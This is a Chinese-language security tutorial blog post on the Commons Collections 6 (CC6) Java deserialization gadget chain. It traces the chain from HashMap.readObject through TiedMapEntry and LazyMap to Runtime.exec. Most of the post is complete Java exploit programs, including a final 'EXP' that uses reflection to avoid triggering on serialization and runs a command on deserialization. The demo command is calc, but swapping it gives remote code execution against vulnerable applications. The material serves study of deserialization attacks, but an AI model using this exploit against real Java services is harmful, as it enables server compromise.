---
title: java反序列化之CC6
date: 2026-05-13
tags: 
  - java安全
  - 反序列化专题
  - CC链
categories: 
  - web安全
  - java安全
excerpt: java反序列化之CC6
---

# java反序列化之CC6

## CC6 链分析

前半段链子，从`LazyMap`到`InvokerTransformer`类是一样的。

我们直接从`LazyMap`开始找其他调用`get`的地方。

### 寻找链子

在 ysoSerial 给的链子中，是`TiedMapEntry`的`getValue()`方法调用了`LazyMap`的`get()`方法。

再来一次`LazyMap`弹出计算器的方法：

```java
package org.example.originaltest;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class CC6Test {
    public static void main(String[] args) {

        Runtime runtime = Runtime.getRuntime();

        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});

        HashMap<Object, Object> map = new HashMap<>();
        Map decorate = LazyMap.decorate(map, exec);

        decorate.get(runtime);
    }
}
```

下一步就是让`TiedMapEntry`类中的`getValue()`方法调用了`LazyMap`的`get()`方法。下面使用`TiedMapEntry`写一个exp。

```java
package org.example.originaltest;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class CC6Test {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");
        tiedMapEntry.getValue();
        
    }
}
```

这里的逻辑还是很简单的，我们创建一个`TiedMapEntry`对象，然后把我们构造的`LazyMap`传进去并直接调用`setValue`方法，就会调用到`map.get(key)`。

接下来向上找谁调用了`TiedMapEntry` 中的 `getValue()` 方法。

`getvalue`这一个方法非常常见，所以一般优先找同一个类下面是否存在调用。

于是找到在这个类下`hashCode()`方法中调用了`getValue()`方法：

```java
public int hashCode() {
        Object value = getValue();
        return (getKey() == null ? 0 : getKey().hashCode()) ^
               (value == null ? 0 : value.hashCode()); 
    }
```

在实战中，如果我们在链子中找到了`hashCode()`方法，说明链子的构造已经快成功了。

### 与入口类结合的链子

在 Java 反序列化中，找到`hashCode()`之后的链子基本都是`HashMap`这一条。

```java
xxx.readObject()
	HashMap.put() --自动调用-->   HashMap.hash()
		后续利用链.hashCode()
```

写一段从`HashMap.put`开始到`InvokerTransformer`结尾的弹计算器的exp：

```java
package org.example.originaltest;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class CC6Test {

    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
    }

    public static void main(String[] args) throws Exception{

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");

        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry,"value");

        serialize(expMap);
        unserialize("ser.bin");

    }
}  
```

`HashMap`的`put`方法自动调用`hashCode`方法，尝试构造exp，结果出现了一个神奇的现象，在序列化时就能弹出 计算器，与 URLDNS 链的情况一模一样。

所以我们需要在执行`put()`方法时，先不让其命令执行，在反序列化时再命令执行。

我们可以通过修改`Map lazyMap = LazyMap.decorate(map, chainedTransformer)`，来达到我们需要的效果。我们之前传的参数是`chainedTransformer`，如果我们在序列化的时候传入一个没用的东西，然后再在反序列化的时候通过反射改回`chainedTransformer`，就可以避免在序列化时触发命令执行。

### 最终 EXP

```java
package org.example.originaltest;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6Test {

    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
    }

    public static void main(String[] args) throws Exception{

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map lazymap = LazyMap.decorate(map, new ConstantTransformer(1));

        HashMap<Object, Object> mapSerial = new HashMap<>();
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "aaa");
        mapSerial.put(tiedMapEntry,"bbb");
        map.remove("aaa");

        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factory = lazyMapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazymap,chainedTransformer);

        serialize(mapSerial);
        unserialize("ser.bin");

    }
}
```

现在从头开始梳理一下利用链：

1. `HashMap`这个入口类重写了`readObject`方法，当`HashMap`被反序列化时会被自动执行，而在重写的`readObject`方法中会对`key`，也就是我们`put(key,value)`的`key`，调用`hash`方法，最终调用`key`的`hashCode()`方法。

2. 所以我们要对`HashMap`的`key`进行构造，这时我们构造一个`TiedMapEntry`并放入键，值随便写一个，在调用链中就会调用`TiedMapEntry`的`hashCode`方法，在此方法中会调用`TiedMapEntry`的`getValue`方法，在`getValue`方法中会调用属性`map`的`get`方法。如果我们把这个`map`属性设置为`LazyMap`对象，就会调用`LazyMap`的`get`方法。之后就和 CC1 的利用链一样了。

3. 然后就是关于以下部分源码的解读：
   ```java
   HashMap<Object, Object> map = new HashMap<>();
   Map lazymap = LazyMap.decorate(map, new ConstantTransformer(1));
   
   HashMap<Object, Object> mapSerial = new HashMap<>();
   TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "aaa");
   mapSerial.put(tiedMapEntry,"bbb");
   map.remove("aaa");
   ```

   首先创建了一个`HashMap`作为`LazyMap`的内部存储，然后创建一个`LazyMap`对象并用`new ConstantTransformer(1)`来防止序列化时触发命令执行。`HashMap<Object, Object> mapSerial = new HashMap<>()`这个`HashMap`则是最终要被序列化的入口类，然后创建一个`TiedMapEntry`对象用来接收`LazyMap`补全调用链，同时`TiedMapEntry`的`key`属性被设置为`aaa`，所以当调用`map.get(key)`时就为`lazymap.get("aaa")`。然后把我们的 payload 放到`HashMap`中，就能触发利用链。
   **关于`map.remove("aaa")`的解释**：
   ```text
   mapSerial.put(tiedMapEntry, "bbb")
     │
     ├─→ HashMap.put()
     │     │
     │     └─→ putVal(hash(key), key, value, ...)
     │           │
     │           └─→ hash(tiedMapEntry)
     │                 │
     │                 └─→ tiedMapEntry.hashCode()    ← 入口
     │                       │
     │                       └─→ getValue()
     │                             │
     │                             └─→ lazymap.get("aaa")
     │                                   │
     │                                   ├─→ 检查内部 map 是否包含 "aaa"?
     │                                   │   map.containsKey("aaa") → false (map 是空的)
     │                                   │
     │                                   ├─→ 不包含！触发 factory
     │                                   │   factory.transform("aaa")
     │                                   │   ConstantTransformer(1).transform("aaa")
     │                                   │   返回: 1
     │                                   │
     │                                   ├─→ 放入内部 map
     │                                   │   map.put("aaa", 1)
     │                                   │   现在 map = {"aaa" → 1}
     │                                   │
     │                                   └─→ 返回 1
     │
     └─→ 最终 mapSerial = {tiedMapEntry → "bbb"}
   ```

   所以此时`LazyMap`中有一个键值对`aaa->1`，我们需要删除它，以便后续的调用。

## 总结

```text
xxx.readObject()
	HashMap.put()
	HashMap.hash()
		TiedMapEntry.hashCode()
		TiedMapEntry.getValue()
			LazyMap.get()
				ChainedTransformer.transform()
					InvokerTransformer.transform()
						Runtime.exec()
```

这是CC6的利用链。这也是最好用的利用链，因为不受 jdk 版本的影响。



























